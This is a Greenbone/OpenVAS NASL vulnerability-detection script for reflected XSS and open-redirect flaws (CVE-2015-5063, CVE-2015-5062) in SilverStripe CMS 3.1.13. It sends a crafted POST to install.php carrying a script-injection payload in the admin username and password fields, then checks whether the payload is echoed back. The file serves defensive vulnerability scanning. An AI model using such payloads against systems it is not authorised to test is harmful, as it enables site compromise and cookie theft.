if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805592" );
	script_version( "2020-10-29T15:35:19+0000" );
	script_cve_id( "CVE-2015-5063", "CVE-2015-5062" );
	script_tag( name: "cvss_base", value: "5.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-10-29 15:35:19 +0000 (Thu, 29 Oct 2020)" );
	script_tag( name: "creation_date", value: "2015-06-22 12:00:20 +0530 (Mon, 22 Jun 2015)" );
	script_name( "SilverStripe CMS Multiple Vulnerabilities - June15" );
	script_tag( name: "summary", value: "This host is installed with SilverStripe CMS
  and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP POST request
  and check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws exist due to:

  - Insufficient validation of input passed via 'admin_username' and
  'admin_password' POST parameter to install.php script.

  - Application does not validate the 'returnURL' GET parameter upon submission
  to the /dev/build script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to create a specially crafted URL, that if clicked, would redirect
  a victim from the intended legitimate web site to an arbitrary web site of the
  attacker's choosing, and execute arbitrary HTML and script code in the context
  of an affected site." );
	script_tag( name: "affected", value: "SilverStripe CMS version 3.1.13" );
	script_tag( name: "solution", value: "Upgrade to SilverStripe CMS version 3.1.14
  or later." );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2015/Jun/44" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/132223" );
	script_xref( name: "URL", value: "http://hyp3rlinx.altervista.org/advisories/AS-SILVERSTRIPE0607.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://www.silverstripe.com" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
host = http_host_name( port: http_port );
for dir in nasl_make_list_unique( "/", "/Silverstripe-cms", "/Silverstripe", "/cms", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: http_port );
	if(ContainsString( rcvRes, "<title>Home" ) && ContainsString( rcvRes, "content=\"SilverStripe" )){
		url = dir + "/install.php";
		postData = "admin[username]=\"><script>alert(document.cookie)</script>&ad" + "min[password]=\"><script>alert(document.cookie)</script>";
		sndReq = NASLString( "POST ", url, " HTTP/1.1\r\n", "Host: ", host, "\r\n", "Accept-Encoding: gzip,deflate\r\n", "Content-Type: application/x-www-form-urlencoded\r\n", "Content-Length: ", strlen( postData ), "\r\n\r\n", postData );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "><script>alert(document.cookie)</script>" ) && ContainsString( rcvRes, "<title>SilverStripe CMS" )){
			security_message( port: http_port );
			exit( 0 );
		}
	}
}
exit( 99 );

